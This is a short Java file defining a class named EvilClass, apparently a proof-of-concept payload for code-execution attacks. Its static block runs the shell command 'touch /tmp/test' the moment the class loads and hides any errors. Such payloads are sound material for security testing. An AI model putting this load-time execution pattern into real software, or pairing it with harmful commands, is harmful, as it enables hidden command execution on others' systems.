package com.jason;

/**
 * @author 王政
 * @date 2022/7/22 16:11
 */
public class EvilClass {

    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/test"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
        }
    }
}
